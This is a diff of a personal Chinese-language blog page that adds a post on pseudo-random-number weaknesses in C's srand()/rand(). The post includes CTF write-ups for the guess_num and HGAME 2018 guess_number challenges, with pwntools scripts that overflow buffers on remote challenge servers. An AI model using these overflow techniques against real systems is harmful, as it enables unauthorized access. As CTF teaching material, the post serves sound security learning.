@@ -189,7 +189,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-count">40</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -236,6 +236,105 @@
       
 
       
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2021/01/13/pwn-%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E%E2%80%9C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="mark0519">
+      <meta itemprop="description" content="我是Mark，第一次玩博客的小萌新~">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mark的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/13/pwn-%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E%E2%80%9C/" class="post-title-link" itemprop="url">pwn-随机数漏洞</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-01-13 16:57:21" itemprop="dateCreated datePublished" datetime="2021-01-13T16:57:21+08:00">2021-01-13</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-01-29 00:33:02" itemprop="dateModified" datetime="2021-01-29T00:33:02+08:00">2021-01-29</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="pwn-随机数漏洞"><a href="#pwn-随机数漏洞" class="headerlink" title="pwn-随机数漏洞"></a>pwn-随机数漏洞</h1><p>PWN中通常使用srand()和rand()配合使用来设置伪随机数。通常当我们输入的数可以覆盖到srand()中的值时，我们可以预测rand()产生固定序列。</p>
+<h2 id="关于rand-和sand"><a href="#关于rand-和sand" class="headerlink" title="关于rand()和sand()"></a>关于rand()和sand()</h2><h3 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h3><p>rand()函数是使用线性同余法生成随机数，因为其周期特别长，所以在一定范围内可以看成随机的。但每次生成都是固定的序列</p>
+<p>我们使用如下代码生成10个随机数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,rand());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时查看运行结果，多次运行结果一样。</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/a696f0fc2180e37d2d58c4dc6f5c157a3041bf7b.png"></p>
+<p>srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned int类型，通常我们会使用时间time(NULL)或time(0)作为seed。当我们不设置srand()时，将默认为srand(1)。如果我们设置某个固定的seed，那么虽然在同一次运行时，会有不同的随机数产生，但是对于这段程序的多次运行所得到的结果是不变的。如下代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	srand(<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;seed = 2:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,rand());</span><br><span class="line">    srand(<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\nseed = 3:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,rand());</span><br><span class="line">    srand(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\nseed = 2:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,rand());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果如图：</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/07e3e8f184781cabd639a53460fd6c9f15769c4d.png"></p>
+<h2 id="攻防世界guess-num"><a href="#攻防世界guess-num" class="headerlink" title="攻防世界guess_num"></a>攻防世界guess_num</h2><p>来自攻防世界的guess_num</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>先用IDApro反汇编elf文件，关键部分如下</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bf5bb2241525becc1bafea07f7a55eaafb10cbd3.png"></p>
+<p>反汇编后发现随机数漏洞</p>
+<p>即可以通过覆盖name的值来改变seed的值</p>
+<p>而C语言随机数中的随机数为伪随机数，可以通过在Linux系统中编写相同seed的代码找到这些随机数</p>
+<h3 id="成成随机数的代码"><a href="#成成随机数的代码" class="headerlink" title="成成随机数的代码"></a>成成随机数的代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   srand(<span class="number">1</span>);</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">   	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,rand()%<span class="number">6</span>+<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c=remote(<span class="string">&quot;220.249.52.134&quot;</span>,<span class="string">&quot;48107&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>+p64(<span class="number">1</span>)</span><br><span class="line">c.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">ins=[<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>]  <span class="comment">#通过gcc编译的代码找到的随机数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ins:</span><br><span class="line">	c.recvuntil(<span class="string">&quot;number:&quot;</span>)</span><br><span class="line">	c.sendline(<span class="built_in">str</span>(i))   <span class="comment">#注意，sendline发送的都为字符型数据，要想发送数字得加上str()函数</span></span><br><span class="line"></span><br><span class="line">c.recv()</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="HGAME-2018-guess-number"><a href="#HGAME-2018-guess-number" class="headerlink" title="HGAME 2018 guess_number"></a>HGAME 2018 guess_number</h2><p>杭电的Vidar-Team举办的校内赛，其中也有一道利用随机数漏洞的题</p>
+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>题目流程很简单，首先生成一个随机数，使用这个随机数作为rand()的种子，生成随机数，与用户输入的随机数进行比较，比较正确就会返回system(‘cat flag’)。</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/a16187c541ebc6700f0655d7471a7353a4c08a65.png"></p>
+<p>在这题中，并不需要利用随机数伪随机的性质，在guess_num函数中的栈溢出是可以利用的，这个随机数是以参数的方式传入的，在比较时寻址方式是用ebp+4来寻址的，也就是说利用栈溢出覆盖，完全可以将随机数覆盖成任意值。</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.230.149.72 &#x27;</span>, <span class="number">10002</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;enter your guess:&#x27;</span>)</span><br><span class="line">a = <span class="string">&quot;0\x00&quot;</span></span><br><span class="line">a = a.ljust(<span class="number">0x128</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.sendline(a)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
     
 
 
@@ -885,80 +984,6 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/11/18/pwn-learn-exp/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2020/11/18/my-first-pwn/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="mark0519">
-      <meta itemprop="description" content="我是Mark，第一次玩博客的小萌新~">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="mark的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/11/18/my-first-pwn/" class="post-title-link" itemprop="url">第一道pwn题</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2020-11-18 22:12:37 / 修改时间：23:36:45" itemprop="dateCreated datePublished" datetime="2020-11-18T22:12:37+08:00">2020-11-18</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="我的第一道pwn题"><a href="#我的第一道pwn题" class="headerlink" title="我的第一道pwn题"></a>我的第一道pwn题</h1><p>（其实就是一道pwn的最最最最基础的题目，只是这是渣渣第一次做掉pwn，我觉得有必要纪念一下QAQ）</p>
-<p>（而且还是对着writeup做的QAQ）</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/11/18/my-first-pwn/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
